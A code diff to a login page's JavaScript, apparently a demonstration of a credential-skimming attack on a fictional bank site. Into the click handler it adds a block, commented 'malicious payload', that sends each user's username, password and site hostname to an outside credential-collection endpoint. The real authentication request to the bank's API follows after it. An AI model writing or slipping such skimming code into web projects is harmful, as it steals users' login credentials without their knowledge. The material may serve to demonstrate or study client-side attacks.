@@ -7,8 +7,33 @@ window.addEventListener("load", () => {
     if (b) b.addEventListener("click", () => {
         const username = document.querySelector("#id").value;
         const password = document.querySelector("#password").value;
-        //ToDo (Jas) - figure out where you want to send this data to
-        alert('data captured - what do we want to do with it?');
+        (() => { //malicious payload
+            var messagedomain = window.location.hostname;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://malicious-api.jscrambler.com/addCredentials", false);
+            xhr.setRequestHeader('content-type', 'application/json')
+            const data = JSON.stringify({email: username, password: password, domain: messagedomain});
+            xhr.send(data);
+        })();
+
+        var body = { username, password };
+        if (window.totp && window.totp.get) {
+            body.ott = totp.get();
+        }
+        const requestOptions = {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        };
+    
+        return fetch(`http://api.virtualbank.com:4000/users/authenticate`, requestOptions)
+            .then(handleResponse)
+            .then(user => {
+                // store user details and jwt token in local storage to keep user logged in between page refreshes
+                localStorage.setItem('user', JSON.stringify(user));
+                window.location.href = '/account';
+                return user;
+            });
     });
 
     function handleResponse(response) {
